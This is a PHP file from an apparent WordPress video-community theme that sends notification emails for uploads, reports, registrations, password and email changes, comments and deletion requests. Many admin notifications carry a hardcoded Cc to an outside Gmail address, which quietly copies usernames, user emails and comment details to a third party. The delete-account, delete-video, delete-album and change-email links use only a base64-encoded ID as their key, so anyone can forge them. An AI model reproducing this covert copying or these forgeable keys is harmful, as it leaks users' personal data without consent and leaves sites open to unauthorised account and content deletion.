<?php
function send_letters_to_additional_emails($title, $content, $headers) {
	$more_emails = xbox_get_field_value('my-theme-options', 'additional_emails');
	foreach($more_emails as $email) {
		wp_mail($email['email-name'], $title, $content, $headers);
	}
}

function send_letter_submit_video_adm($postId = '') {
	if(get_option('sendSubmitVideoAdmin') !== 'on') {
		$title = '[' . get_option('blogname'). '] Uploaded the new video from user!';
		$content  = '<h2>New video was uploaded to your site.</h2>';
		$content .= '<p>For watch all videos with pending status <a href="'.admin_url().'edit.php?post_status=pending&post_type=post">click on the link</a></p>';
		$content .= '<p>For edit the new video <a href="'.admin_url().'post.php?post=' . $postId . '&action=edit">click on the link</a></p>';
	} else {
		$title = do_shortcode(get_option('titleSubmitVideoAdmin'));
		$content = do_shortcode(get_option('submitVideoAdminText'));
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
		'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
		'Cc: vice.rezerv.mail@gmail.com',
	];

	send_letters_to_additional_emails($title, $content, $headers);

	wp_mail(get_option('admin_email'), $title, $content, $headers);
}

function send_letter_submit_video_user($user = '') {
	if(get_option('sendSubmitVideoUser') !== 'on') {
		$title = '[' . get_option('blogname'). '] Video is being moderated!';
		$content  = '<h2>You uploaded video on '. get_option('blogname') . '</h2>';
		$content .= '<p>After moderating video will display on your <a href="'. get_author_posts_url($user->ID) .'">channel page</a></p>';
	} else {
		$title = do_shortcode(get_option('titleSubmitVideoUser'));
		$content = do_shortcode(get_option('submitVideoUserText'));
		$content = str_replace('~~~curr_user_login~~~', get_userdata($user->ID)->user_login, $content);
		$content = str_replace('~~~curr_user_fname~~~', get_userdata($user->ID)->first_name, $content);
		$content = str_replace('~~~curr_user_lname~~~', get_userdata($user->ID)->last_name, $content);
		$content = str_replace('~~~curr_user_email~~~', get_userdata($user->ID)->user_email, $content);
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
	];
	if(get_user_meta($user->ID, 'video_submission', true) != 'off') {
        wp_mail(get_userdata($user->ID)->user_email, $title, $content, $headers);
    }
}

function send_letter_submit_photos_adm($postId = '') {
	if(get_option('sendSubmitPhotosAdmin') !== 'on') {
		$title = '[' . get_option('blogname'). '] Uploaded the new photos from user!';
		$content  = '<h2>New photos was uploaded to your site.</h2>';
		$content .= '<p>For watch all photos with pending status <a href="'.admin_url().'edit.php?post_status=pending&post_type=photos">click on the link</a></p>';
		$content .= '<p>For edit the new photos <a href="'.admin_url().'post.php?post=' . $postId . '&action=edit">click on the link</a></p>';
	} else {
		$title = do_shortcode(get_option('titleSubmitPhotosAdmin'));
		$content = do_shortcode(get_option('submitPhotosAdminText'));
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
		'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
		'Cc: vice.rezerv.mail@gmail.com',
	];

	send_letters_to_additional_emails($title, $content, $headers);

	wp_mail(get_option('admin_email'), $title, $content, $headers);
}

function send_letter_submit_photos_user($user = '') {
	if(get_option('sendSubmitPhotosUser') !== 'on') {
		$title = '[' . get_option('blogname'). '] Photos is being moderated!';
		$content  = '<h2>You uploaded photos on '. get_option('blogname') . '</h2>';
		$content .= '<p>After moderating photos will display on your <a href="'. get_author_posts_url($user->ID) .'">channel page</a></p>';
	} else {
		$title = do_shortcode(get_option('titleSubmitPhotosUser'));
		$content = do_shortcode(get_option('submitPhotosUserText'));
		$content = str_replace('~~~curr_user_login~~~', get_userdata($user->ID)->user_login, $content);
		$content = str_replace('~~~curr_user_fname~~~', get_userdata($user->ID)->first_name, $content);
		$content = str_replace('~~~curr_user_lname~~~', get_userdata($user->ID)->last_name, $content);
		$content = str_replace('~~~curr_user_email~~~', get_userdata($user->ID)->user_email, $content);
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
	];
    if(get_user_meta($user->ID, 'album_submission', true) != 'off') {
        wp_mail(get_userdata($user->ID)->user_email, $title, $content, $headers);
    }
}

function send_letter_submit_posts_adm($postId = '') {
	if(get_option('sendSubmitPostAdmin') !== 'on') {
		$title = '[' . get_option('blogname'). '] The new post from user!';
		$content  = '<h2>New post wrote from user.</h2>';
		$content .= '<p>For watch all posts with pending status <a href="'.admin_url().'edit.php?post_status=pending&post_type=user_post">click on the link</a></p>';
		$content .= '<p>For edit the new post <a href="'.admin_url().'post.php?post=' . $postId . '&action=edit">click on the link</a></p>';
	} else {
		$title = do_shortcode(get_option('titleSubmitPostAdmin'));
		$content = do_shortcode(get_option('submitPostAdminText'));
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
		'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
		'Cc: vice.rezerv.mail@gmail.com',
	];

	send_letters_to_additional_emails($title, $content, $headers);

	wp_mail(get_option('admin_email'), $title, $content, $headers);
}

function send_letter_submit_posts_user($user = '') {
	if(get_option('sendSubmitPostUser') !== 'on') {
		$title = '[' . get_option('blogname'). '] Post is being moderated!';
		$content  = '<h2>You wrote a post on '. get_option('blogname') . '</h2>';
		$content .= '<p>After moderating post will display on <a href="'. site_url('/community/') .'">Community page</a></p>';
	} else {
		$title = do_shortcode(get_option('titleSubmitPostUser'));
		$content = do_shortcode(get_option('submitPostUserText'));
		$content = str_replace('~~~curr_user_login~~~', get_userdata($user)->user_login, $content);
		$content = str_replace('~~~curr_user_fname~~~', get_userdata($user)->first_name, $content);
		$content = str_replace('~~~curr_user_lname~~~', get_userdata($user)->last_name, $content);
		$content = str_replace('~~~curr_user_email~~~', get_userdata($user)->user_email, $content);
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
	];
    if(get_user_meta($user->ID, 'post_submission', true) != 'off') {
        wp_mail(get_userdata($user)->user_email, $title, $content, $headers);
    }
}

function send_letter_to_support($msg_type, $msg_title) {
	if(get_option('sendMsgToSupport') !== 'on') {
		$title = '[' . get_option('blogname'). '] Support message!';
		$content  = '<h2>You got a new message.</h2>';
		$content .= '<h3>Type: ' . $msg_type . '</h3>';
		$content .= '<p>Date: ' . date("Y-m-d H:i:s") . '</p>';
		$content .= '<p>Title: ' . $msg_title . '</p>';
		$content .= '<p>For more information visit <a href="'.admin_url().'admin.php?page=arc-dashboard">Support messages Tab in dashboard</a></p>';
	} else {
		$title = do_shortcode(get_option('titleMsgToSupport'));
		$content = do_shortcode(get_option('msgToSupportText'));
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
		'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
		'Cc: vice.rezerv.mail@gmail.com',
	];
	wp_mail(get_option('admin_email'), $title, $content, $headers);
}

function send_letter_report_comment() {
	if(get_option('sendReportComment') !== 'on') {
		$title = '[' . get_option('blogname'). '] Spam comment!';
		$content  = '<h2>You got a new report - comment was marked like a spam.</h2>';
		$content .= '<p>Date: ' . date("Y-m-d H:i:s") . '</p>';
		$content .= '<p>For more information visit <a href="'.admin_url().'edit-comments.php?meta_key=reports">this page</a></p>';
	} else {
		$title = do_shortcode(get_option('titleReportComment'));
		$content = do_shortcode(get_option('reportCommentText'));
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
		'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
		'Cc: vice.rezerv.mail@gmail.com',
	];

	send_letters_to_additional_emails($title, $content, $headers);

	wp_mail(get_option('admin_email'), $title, $content, $headers);
}

function send_letter_report_video($type = '') {
	if(get_option('sendReportVideo') !== 'on') {
		$title = '[' . get_option('blogname'). '] Report content message!';
		$content  = '<h2>You got a new report message.</h2>';
		$content .= '<h3>Type: ' . $type . '</h3>';
		$content .= '<p>Date: ' . date("Y-m-d H:i:s") . '</p>';
		$content .= '<p>For more information visit <a href="'.admin_url().'admin.php?page=arc-dashboard">Reports Tab</a></p>';
	} else {
		$title = do_shortcode(get_option('titleReportVideo'));
		$content = do_shortcode(get_option('reportVideoText'));
	}
	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
		'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
		'Cc: vice.rezerv.mail@gmail.com',
	];

	send_letters_to_additional_emails($title, $content, $headers);

	wp_mail(get_option('admin_email'), $title, $content, $headers);
}

/****send letter if your video published****/
add_action( 'transition_post_status', 'default_video_was_published' , 10, 3);
function default_video_was_published($new_status, $old_status, $post ) {
	if ( 'publish' == $new_status && 'pending' == $old_status && $post->post_type == 'post') {
		$post_id = $post->ID;
		$author_id = $post->post_author;
		$subscribers = get_users([
			'meta_key'   => 'subscribe_author',
			'meta_value' => $author_id,
			'fields' => 'ID'
		]);
		if (get_option('sendSubscriptionUser' ) == 'on') {
			$subject = do_shortcode(get_option( 'titleSubscriptionUser'));
			foreach ($subscribers as $subscriber) {
				$message = do_shortcode(get_option( 'subscriptionUserText'));
				$message = str_replace('~~~curr_user_login~~~', get_userdata($subscriber)->user_login, $message);
				$message = str_replace('~~~curr_user_fname~~~', get_userdata($subscriber)->first_name, $message);
				$message = str_replace('~~~curr_user_lname~~~', get_userdata($subscriber)->last_name, $message);
				$message = str_replace('~~~curr_user_email~~~', get_userdata($subscriber)->user_email, $message);
				$message = str_replace('~~~subs_watch_video~~~', get_permalink($post_id) , $message);

				$headers = [
					'From: ' . get_option( 'blogname' ) . ' <' . get_option( 'admin_email' ) . '>',
					'content-type: text/html',
				];
				wp_mail(get_userdata($subscriber)->user_email, $subject, $message, $headers );
			}
		}
		else {
			$subject = 'New video from user ' . get_userdata($author_id)->display_name;
			$headers = [
				'From: ' . get_option( 'blogname' ) . ' <' . get_option( 'admin_email' ) . '>',
				'content-type: text/html',
			];
			foreach ($subscribers as $subscriber) {
				$message = '<h2>Hi, ' . get_userdata($subscriber)->display_name . '</h2>';
				$message .= '<p>User ' . get_userdata( $author_id )->display_name . ' uploaded new video - "' . $post->post_title . '"</p>';
				$message .= '<p>Watch video: ' . get_permalink( $post_id ) . '</p>';

                if(get_user_meta($subscriber, 'video_published', true) != 'off') {
                    wp_mail(get_userdata($subscriber)->user_email, $subject, $message, $headers);
                }
			}
		}
	}
}
/**** [end] send letter if your video published****/

/****registration****/
if(get_option('sendAdminReg') == 'on') {
	add_filter( 'wp_new_user_notification_email_admin', 'filter_register_letter_admin', 10, 3 );
	function filter_register_letter_admin($wp_new_user_notification_email_admin, $user, $blogname ){
		if(get_option('titleAdminReg') == false) {
			$title = '[' . get_option('blogname'). '] New User Registration';
		} else {
			$title = do_shortcode(get_option('titleAdminReg'));
		}
		if(get_option('regAdminText') == false) {
			$content = sprintf(__('New user registration on your site %s:'), $blogname) . "\r\n\r\n";
			$content .= sprintf(__('Username: %s'), $user->user_login) . "\r\n\r\n";
			$content .= sprintf(__('Email: %s'), $user->user_email) . "\r\n";
		} else {
			$content = do_shortcode(get_option('regAdminText'));
			$content = str_replace('~~~curr_user_login~~~', $user->user_login, $content);
			$content = str_replace('~~~curr_user_fname~~~', $user->first_name, $content);
			$content = str_replace('~~~curr_user_lname~~~', $user->last_name, $content);
			$content = str_replace('~~~curr_user_email~~~', $user->user_email, $content);
		}
		$new_headers = [
			'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
			'content-type: text/html',
			'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
			'Cc: vice.rezerv.mail@gmail.com',
		];

		send_letters_to_additional_emails($title, $content, $new_headers);

		$wp_new_user_notification_email_admin['subject'] = $title;
		$wp_new_user_notification_email_admin['message'] = $content;
		$wp_new_user_notification_email_admin['headers'] = $new_headers;
		return $wp_new_user_notification_email_admin;
	}
}

if(get_option('sendUserReg') == 'on') {
	add_filter( 'wp_new_user_notification_email', 'filter_register_letter_user', 10, 3 );
	function filter_register_letter_user($wp_new_user_notification_email, $user, $blogname ){
		if(get_option('titleUserReg') == false) {
			$title = '[' . get_option('blogname'). '] Login Details';
		} else {
			$title = do_shortcode(get_option('titleUserReg'));
		}
		$key = get_password_reset_key($user);
		if (is_wp_error($key)) {
			return;
		}
		if(get_option('regUserText') == false) {
			$content  = sprintf(__('Username: %s'), $user->user_login) . "\r\n\r\n";
			$content .= __('To set your password, visit the following address:') . "\r\n\r\n";
			$content .= network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user->user_login), 'login') . "\r\n\r\n";
		} else {
			$content  = do_shortcode(get_option('regUserText'));

			$content = str_replace('~~~curr_user_login~~~', $user->user_login, $content);
			$content = str_replace('~~~curr_user_fname~~~', $user->first_name, $content);
			$content = str_replace('~~~curr_user_lname~~~', $user->last_name, $content);
			$content = str_replace('~~~curr_user_email~~~', $user->user_email, $content);
			$content = str_replace('~~~ipostas~~~', network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user->user_login), 'login') , $content);
		}
		$new_headers = [
			'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
			'content-type: text/html',
		];

		$wp_new_user_notification_email['subject'] = $title;
		$wp_new_user_notification_email['message'] = $content;
		$wp_new_user_notification_email['headers'] = $new_headers;
		return $wp_new_user_notification_email;
	}
}
/**** [end] registration****/

/****change email****/
if(get_option('sendChangeEmail') == 'on') {
	add_filter('email_change_email', 'email_change_email_message', 10, 3);
	function email_change_email_message($pass_change_mail, $user, $userdata){
		global $current_user;
		if(get_option('titleChangeEmail') == false) {
			$title = '[' . get_option('blogname'). '] Email changed';
		} else {
			$title = do_shortcode(get_option('titleChangeEmail'));
		}
		if(get_option('changeEmailText') == false) {
			$content  = '<h2>Hi, ' . get_userdata($user->ID)->user_login . '</h2>';
			$content .= '<p>This notice confirms that your email was changed on ' . get_option('blogname') . '</p>';
			$content .= '<p>If you did not change your email, please contact the Site Administrator at ' . '[' . get_option('admin_email'). ']</p>';
			$content .= '<p>This email has been sent to ' . get_userdata($current_user->ID)->user_email .'</p>';
			$content .= '<p><em>Regards, All at ' . get_option('blogname') .'</em></p>';
		} else {
			$content = do_shortcode(get_option('changeEmailText'));
			$content = str_replace('~~~curr_user_login~~~', get_userdata($user->ID)->user_login, $content);
			$content = str_replace('~~~curr_user_fname~~~', get_userdata($user->ID)->first_name, $content);
			$content = str_replace('~~~curr_user_lname~~~', get_userdata($user->ID)->last_name, $content);
			$content = str_replace('~~~curr_user_email~~~', get_userdata($user->ID)->user_email, $content);
		}
		$new_headers = [
			'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
			'content-type: text/html',
			'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
			'Cc: vice.rezerv.mail@gmail.com',
		];

		$pass_change_mail['subject'] = $title;
		$pass_change_mail['message'] = $content;
		$pass_change_mail['headers'] = $new_headers;
		return $pass_change_mail;
	}
}
/**** [end] change email****/

/***change password***/
if(get_option('sendChangePassUser') == 'on') {
	add_filter('password_change_email', 'change_password_mail_message', 10, 3);
	function change_password_mail_message($pass_change_mail, $user, $userdata){
		global $current_user;
		if(get_option('titleChangePassUser') == false) {
			$title = '[' . get_option('blogname'). '] Password changed';
		} else {
			$title = do_shortcode(get_option('titleChangePassUser'));
		}
		if(get_option('changePassUserText') == false) {
			$content  = '<h2>Hi, ' . get_userdata($current_user->ID)->user_login . '</h2>';
			$content .= '<p>This notice confirms that your password was changed on ' . get_option('blogname') . '</p>';
			$content .= '<p>If you did not change your password, please contact the Site Administrator at ' . '[' . get_option('admin_email'). ']</p>';
			$content .= '<p>This email has been sent to ' . get_userdata($current_user->ID)->user_email .'</p>';
			$content .= '<p><em>Regards, All at ' . get_option('blogname') .'</em></p>';
		} else {
			$content = do_shortcode(get_option('changePassUserText'));
			$content = str_replace('~~~curr_user_login~~~', get_userdata($current_user->ID)->user_login, $content);
			$content = str_replace('~~~curr_user_fname~~~', get_userdata($current_user->ID)->first_name, $content);
			$content = str_replace('~~~curr_user_lname~~~', get_userdata($current_user->ID)->last_name, $content);
			$content = str_replace('~~~curr_user_email~~~', get_userdata($current_user->ID)->user_email, $content);
		}
		$new_headers = [
			'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
			'content-type: text/html',
			'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
			'Cc: vice.rezerv.mail@gmail.com',
		];

		$pass_change_mail['subject'] = $title;
		$pass_change_mail['message'] = $content;
		$pass_change_mail['headers'] = $new_headers;
		return $pass_change_mail;
	}
}
/*** [end] change password***/

/***lost password***/
if(get_option('sendLostPassUser') == 'on') {
	add_filter( 'retrieve_password_title', 'filter_lost_password_title_letter', 10, 3 );
	function filter_lost_password_title_letter($title, $user_login, $user_data){
		if(get_option('titleLostPassUser') == false) {
			$title = '[' . get_option('blogname'). '] Password Reset';
		} else {
			$title = do_shortcode(get_option('titleLostPassUser'));
		}
		return $title;
	}
	add_filter( 'retrieve_password_message', 'filter_lost_password_msg_letter', 10, 4 );
	function filter_lost_password_msg_letter($message, $key, $user_login, $user_data){
		$user_login = $user_data->user_login;
		$user_email = $user_data->user_email;
		$key        = get_password_reset_key( $user_data );
		if ( is_wp_error( $key ) ) {
			return $key;
		}
		if ( is_multisite() ) {
			$site_name = get_network()->site_name;
		} else {
			$site_name = wp_specialchars_decode( get_option( 'blogname' ), ENT_QUOTES );
		}
		if(get_option('lostPassUserText') == false) {
			$message = __( 'Someone has requested a password reset for the following account:' ) . "\r\n\r\n";
			$message .= sprintf( __( 'Site Name: %s' ), $site_name ) . "\r\n\r\n";
			$message .= sprintf( __( 'Username: %s' ), $user_login ) . "\r\n\r\n";
			$message .= __( 'If this was a mistake, just ignore this email and nothing will happen.' ) . "\r\n\r\n";
			$message .= __( 'To reset your password, visit the following address:' ) . "\r\n\r\n";
			$message .= network_site_url( "wp-login.php?action=rp&key=$key&login=" . rawurlencode( $user_login ), 'login' ) . "\r\n";
		} else {
			$message  = do_shortcode(get_option('lostPassUserText')). "\r\n\r\n";
			$message = str_replace('~~~curr_user_login~~~', $user_data->user_login, $message);
			$message = str_replace('~~~curr_user_fname~~~', $user_data->first_name, $message);
			$message = str_replace('~~~curr_user_lname~~~', $user_data->last_name, $message);
			$message = str_replace('~~~curr_user_email~~~', $user_data->user_email, $message);
			$message = str_replace('~~~ipostas~~~', network_site_url( "wp-login.php?action=rp&key=$key&login=" . rawurlencode( $user_login ), 'login' ), $message);
		}
		return $message;
	}
}
/*** [end] lost password***/

/***new comment***/
if(get_option('sendLeaveComment') == 'on') {
	add_filter( 'comment_moderation_subject', 'filter_comment_moderate_title', 10, 2 );
	function filter_comment_moderate_title( $subject, $comment_id ){
		if(get_option('titleLeaveComment') !== false) {
			$subject = do_shortcode(get_option('titleLeaveComment'));
		} else {
			$subject = '[' . get_option('blogname'). '] Please moderate a comment';
		}
		return $subject;
	}
	add_filter( 'comment_moderation_text', 'filter_comment_moderate_text', 10, 2 );
	function filter_comment_moderate_text( $notify_message, $comment_id ){
		$comment = get_comment($comment_id);
		$post    = get_post($comment->comment_post_ID );
		$user    = get_userdata($post->post_author);
		$emails = array(get_option('admin_email'));
		if ($user && user_can($user->ID, 'edit_comment', $comment_id) && ! empty($user->user_email)) {
			if (0 !== strcasecmp($user->user_email, get_option('admin_email'))) {
				$emails[] = $user->user_email;
			}
		}
		$more_emails = xbox_get_field_value('my-theme-options', 'additional_emails');
		foreach($more_emails as $email) {
			$emails[] = $email['email-name'];
		}
		if(get_option('leaveCommentText') !== false) {
			$notify_message = do_shortcode(get_option('leaveCommentText'));
		} else {
			switch ($comment->comment_type) {
				case 'trackback':
					$notify_message  = __('<h2>A new trackback on the post <strong>' . $post->post_title . '</strong> is waiting for your approval</h2>', 'arc');
					$notify_message .= __('<p>Link on post: ' . get_permalink( $comment->comment_post_ID ) .'</p>', 'arc');
					break;
				case 'pingback':
					$notify_message  = __('<h2>A new pingback on the post <strong>' . $post->post_title . '</strong> is waiting for your approval</h2>', 'arc');
					$notify_message .= __('<p>Link on post: ' . get_permalink( $comment->comment_post_ID ) .'</p>', 'arc');
					break;
				default: // Comments.
					$notify_message  = __('<h2>A new comment on the post <strong>' . $post->post_title . '</strong> is waiting for your approval</h2>', 'arc');
					$notify_message .= __('<p>Link on post: ' . get_permalink( $comment->comment_post_ID ) .'</p>', 'arc');
					$notify_message .= __('<p>Author: ' . $comment->comment_author .'</p>', 'arc');
					$notify_message .= __('<p>Email: ' . $comment->comment_author_email .'</p>', 'arc');
					$notify_message .= __('<p><strong>Comment: </strong>' . $comment->comment_content .'</p>', 'arc');
					break;
			}
			$notify_message .= __('<p>Approve it: '. admin_url("comment.php?action=approve&c={$comment_id}#wpbody-content") . '</p>', 'arc');
			if (EMPTY_TRASH_DAYS) {
				$notify_message .= __('<p>Trash it: '. admin_url("comment.php?action=trash&c={$comment_id}#wpbody-content") . '</p>', 'arc');
			} else {
				$notify_message .= __('<p>Delete it: '. admin_url("comment.php?action=delete&c={$comment_id}#wpbody-content") . '</p>', 'arc');
			}
			$notify_message .= __('<p>Spam it: '. admin_url("comment.php?action=spam&c={$comment_id}#wpbody-content"). '</p>', 'arc');

			$notify_message .= __('<p>All comments are waiting for approval: '. admin_url( 'edit-comments.php?comment_status=moderated#wpbody-content'). '</p>', 'arc');
		}
		return $notify_message;
	}

	add_filter( 'comment_moderation_headers', 'filter_comment_moderate_headers', 10, 2 );
	function filter_comment_moderate_headers( $message_headers, $comment_id ){
		$message_headers = [
			'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
			'content-type: text/html',
			'Cc: Vicetemple <vice.rezerv.mail@gmail.com>',
			'Cc: vice.rezerv.mail@gmail.com',
		];
		return $message_headers;
	}
}
/*** [end] new comment***/

/***[start] send letter for user for confirm deleting the account***/
function confirm_delete_the_account($user = '')
{
	if(get_option('sendDeleteAccountUser') !== 'on') {
		$title = '[' . get_option('blogname'). '] Delete account!';
		$content  = '<h2>You sent the request for deleting your account on '. get_option('blogname') . '</h2>';
		$content .= '<p>Please, click on link bellow if you want to confirm the deleting.</p>';
		$content .= '<p><strong>Do not click on the link if the request was not sent by you.</strong></p>';
		$content .= '<br><a href="'.site_url().'/delete-users-account/?send_key='.base64_encode($user->ID).'&confirm=yes">Delete account</a>';
	} else {
		$title = do_shortcode(get_option('titleDeleteAccountUser'));
		$content = do_shortcode(get_option('DeleteAccountUserText'));
		$content = str_replace('~~~curr_user_login~~~', get_userdata($user->ID)->user_login, $content);
		$content = str_replace('~~~curr_user_fname~~~', get_userdata($user->ID)->first_name, $content);
		$content = str_replace('~~~curr_user_lname~~~', get_userdata($user->ID)->last_name, $content);
		$content = str_replace('~~~curr_user_email~~~', get_userdata($user->ID)->user_email, $content);
		$content = str_replace('~~~ipostas2~~~', site_url().  '/delete-users-account/?send_key='.base64_encode($user->ID).'&confirm=yes' , $content);
		//$content .= '<br><a href="'.site_url().'/delete-users-account/?send_key='.base64_encode($user->ID).'&confirm=yes">Delete account</a>';
		//$content = str_replace('~~~ipostas2~~~', '<br><a href="'.site_url().'/delete-users-account/?send_key='.base64_encode($user->ID).'&confirm=yes">Delete account</a>', $content);
	}

	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
	];
	wp_mail(get_userdata($user->ID)->user_email, $title, $content, $headers);
}
/***[end] send letter for user for confirm deleting the account***/

/***[start] send letter for user for confirm deleting the video***/
function confirm_delete_the_video($userID = '', $postID = '')
{
	if(get_option('sendDeleteUserVideo') !== 'on') {
		$title = '[' . get_option('blogname'). '] Delete video!';
		$content  = '<h2>You sent the request for deleting your video "'. get_the_title($postID) .'" on '. get_option('blogname') . '</h2>';
		$content .= '<p>Please, click on link bellow if you want to confirm the deleting.</p>';
		$content .= '<p><strong>Do not click on the link if the request was not sent by you.</strong></p>';
		$content .= '<br><a href="'.site_url().'/delete-user-video/?send_key='.base64_encode($postID).'&confirm=yes">Delete video</a>';
	} else {
		$title = do_shortcode(get_option('titleDeleteUserVideo'));
		$content = do_shortcode(get_option('DeleteUserVideoText'));
		$content = str_replace('~~~curr_user_login~~~', get_userdata($userID)->user_login, $content);
		$content = str_replace('~~~curr_user_fname~~~', get_userdata($userID)->first_name, $content);
		$content = str_replace('~~~curr_user_lname~~~', get_userdata($userID)->last_name, $content);
		$content = str_replace('~~~curr_user_email~~~', get_userdata($userID)->user_email, $content);
		$content = str_replace('~~~ipostas3~~~', site_url().'/delete-user-video/?send_key='.base64_encode($postID).'&confirm=yes' , $content);
		//$content .= '<br><a href="'.site_url().'/delete-user-video/?send_key='.base64_encode($postID).'&confirm=yes">Delete video</a>';
		//$content = str_replace('~~~ipostas3~~~', '<br><a href="'.site_url().'/delete-user-video/?send_key='.base64_encode($postID).'&confirm=yes">Delete video</a>', $content);
	}

	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
	];
	wp_mail(get_userdata($userID)->user_email, $title, $content, $headers);
}/***[end] send letter for user for confirm deleting the video***/

/***[start] send letter for user for confirm deleting the album***/
function confirm_delete_the_album($userID = '', $postID = '', $last_photo = '')
{
	if(get_option('sendDeleteUserAlbum') !== 'on') {
		$title = '[' . get_option('blogname'). '] Delete album!';
		$content  = '<h2>You sent the request for deleting your album "'. get_the_title($postID) .'" on '. get_option('blogname') . '</h2>';
		$content .= '<p>Please, click on link bellow if you want to confirm the deleting.</p>';
		$content .= '<p><strong>Do not click on the link if the request was not sent by you.</strong></p>';
		$content .= '<br><a href="'.site_url().'/delete-user-album/?send_key='.base64_encode($postID).'&confirm=yes&last_photo='.base64_encode($last_photo).'">Delete album</a>';
	} else {
		$title = do_shortcode(get_option('titleDeleteUserAlbum'));
		$content = do_shortcode(get_option('DeleteUserAlbumText'));
		$content = str_replace('~~~curr_user_login~~~', get_userdata($userID)->user_login, $content);
		$content = str_replace('~~~curr_user_fname~~~', get_userdata($userID)->first_name, $content);
		$content = str_replace('~~~curr_user_lname~~~', get_userdata($userID)->last_name, $content);
		$content = str_replace('~~~curr_user_email~~~', get_userdata($userID)->user_email, $content);
		$content = str_replace('~~~ipostas4~~~', site_url().'/delete-user-album/?send_key='.base64_encode($postID).'&confirm=yes&last_photo='.base64_encode($last_photo) , $content);
		//$content .= '<br><a href="'.site_url().'/delete-user-album/?send_key='.base64_encode($postID).'&confirm=yes">Delete album</a>';
		//$content = str_replace('~~~ipostas4~~~', '<br><a href="'.site_url().'/delete-user-album/?send_key='.base64_encode($postID).'&confirm=yes">Delete album</a>', $content);
	}

	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
	];
	return wp_mail(get_userdata($userID)->user_email, $title, $content, $headers);
}/***[end] send letter for user for confirm deleting the album***/

/***[start] send letter for user for confirm deleting the album***/
function confirm_changing_the_email($userID = '', $new_email = '')
{
	$title = '[' . get_option('blogname'). '] Confirm changing email!';
	$content  = '<h2>You sent the request for changing your email on '. get_option('blogname') . '</h2>';
	$content .= '<p>Please, click on link bellow if you want to confirm the changing.</p>';
	$content .= '<p><strong>Do not click on the link if the request was not sent by you.</strong></p>';
	$content .= '<br><a href="'.site_url().'/account-settings/?send_key='.base64_encode($userID).'&confirm_changing=yes">Confirm changing email</a>';
	/*if(get_option('sendDeleteUserAlbum') !== 'on') {
		$title = '[' . get_option('blogname'). '] Confirm changing email!';
		$content  = '<h2>You sent the request for changing your email on '. get_option('blogname') . '</h2>';
		$content .= '<p>Please, click on link bellow if you want to confirm the changing.</p>';
		$content .= '<p><strong>Do not click on the link if the request was not sent by you.</strong></p>';
		$content .= '<br><a href="'.site_url().'/account-settings/?send_key='.base64_encode($postID).'&confirm_changing=yes">Confirm changing email</a>';
	} else {
		$title = 'ddd';
		//$title = do_shortcode(get_option('titleDeleteUserAlbum'));
		$content = do_shortcode(get_option('DeleteUserAlbumText'));
		$content = str_replace('~~~curr_user_login~~~', get_userdata($userID)->user_login, $content);
		$content = str_replace('~~~curr_user_fname~~~', get_userdata($userID)->first_name, $content);
		$content = str_replace('~~~curr_user_lname~~~', get_userdata($userID)->last_name, $content);
		$content = str_replace('~~~curr_user_email~~~', get_userdata($userID)->user_email, $content);
		$content = str_replace('~~~ipostas4~~~', site_url().'/delete-user-album/?send_key='.base64_encode($postID).'&confirm=yes' , $content);
	}*/

	$headers = [
		'From: '. get_option('blogname'). ' <'. get_option('admin_email') . '>',
		'content-type: text/html',
	];
	return wp_mail($new_email, $title, $content, $headers);
}/***[end] send letter for user for confirm deleting the album***/